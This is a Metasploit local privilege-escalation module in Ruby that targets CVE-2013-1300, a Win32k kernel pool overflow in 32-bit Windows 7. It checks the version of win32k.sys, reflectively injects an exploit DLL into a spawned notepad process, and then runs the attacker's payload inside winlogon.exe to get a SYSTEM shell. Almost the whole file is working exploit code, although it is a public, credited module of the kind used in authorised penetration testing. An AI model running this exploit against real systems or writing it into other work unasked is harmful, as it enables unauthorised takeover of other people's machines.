##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/reflective_dll_injection'
require 'rex'

class Metasploit3 < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info, {
      'Name'           => 'Windows NTUserMessageCall Win32k Kernel Pool Overflow (Schlamperei)',
      'Description'    => %q{
        A kernel pool overflow in Win32k which allows local privilege escalation.
        The kernel shellcode nulls the ACL for the winlogon.exe process (a SYSTEM process).
        This allows any unprivileged process to freely migrate to winlogon.exe, achieving
        privilege escalation. Used in pwn2own 2013 by MWR to break out of chrome's sandbox.
        NOTE: when you exit the meterpreter session, winlogon.exe is likely to crash.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
           'Nils', #Original Exploit
           'Jon', #Original Exploit
           'Donato Capitella <donato.capitella[at]mwrinfosecurity.com>', # Metasploit Conversion
           'Ben Campbell <ben.campbell[at]mwrinfosecurity.com>' # Help and Encouragement ;)
        ],
      'Arch'           => ARCH_X86,
      'Platform'       => 'win',
      'SessionTypes'   => [ 'meterpreter' ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Targets'        =>
        [
          [ 'Windows 7 SP0/SP1', { } ]
        ],
      'Payload'        =>
        {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'References'     =>
        [
          [ 'CVE', '2013-1300' ],
          [ 'MSB', 'MS13-053' ],
          [ 'URL', 'https://labs.mwrinfosecurity.com/blog/2013/09/06/mwr-labs-pwn2own-2013-write-up---kernel-exploit/' ]
        ],
      'DisclosureDate' => 'Dec 01 2013',
      'DefaultTarget'  => 0
    }))
  end

  def check
    os = sysinfo["OS"]
    unless (os =~ /windows/i)
      return Exploit::CheckCode::Unknown
    end

    file_path = expand_path("%windir%") << "\\system32\\win32k.sys"
    major, minor, build, revision, branch = file_version(file_path)
    vprint_status("win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}")

    case build
    when 7600
      return Exploit::CheckCode::Vulnerable
    when 7601
      if branch == 18
        return Exploit::CheckCode::Vulnerable if revision < 18176
      else
        return Exploit::CheckCode::Vulnerable if revision < 22348
      end
    end
    return Exploit::CheckCode::Unknown
  end


  def exploit
    if is_system?
      fail_with(Exploit::Failure::None, 'Session is already elevated')
    end

    if sysinfo["Architecture"] =~ /wow64/i
      fail_with(Failure::NoTarget, "Running against WOW64 is not supported")
    elsif sysinfo["Architecture"] =~ /x64/
      fail_with(Failure::NoTarget, "Running against 64-bit systems is not supported")
    end

    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Exploit::Failure::NotVulnerable, "Exploit not available on this system")
    end

    print_status("Launching notepad to host the exploit...")
    notepad_process_pid = cmd_exec_get_pid("notepad.exe")
    begin
      process = client.sys.process.open(notepad_process_pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      print_status("Operation failed. Hosting exploit in the current process...")
      process = client.sys.process.open
    end

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    library_path = ::File.join(Msf::Config.data_directory, "exploits", "cve-2013-1300", "schlamperei.x86.dll")
    library_path = ::File.expand_path(library_path)

    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    thread = process.thread.create(exploit_mem + offset)
    client.railgun.kernel32.WaitForSingleObject(thread.handle, 5000)

    client.sys.process.each_process do |p|
      if p['name'] == "winlogon.exe"
        winlogon_pid = p['pid']
        print_status("Found winlogon.exe with PID #{winlogon_pid}")

        if execute_shellcode(payload.encoded, nil, winlogon_pid)
          print_good("Everything seems to have worked, cross your fingers and wait for a SYSTEM shell")
        else
          print_error("Failed to start payload thread")
        end

        break
      end
    end
  end

end

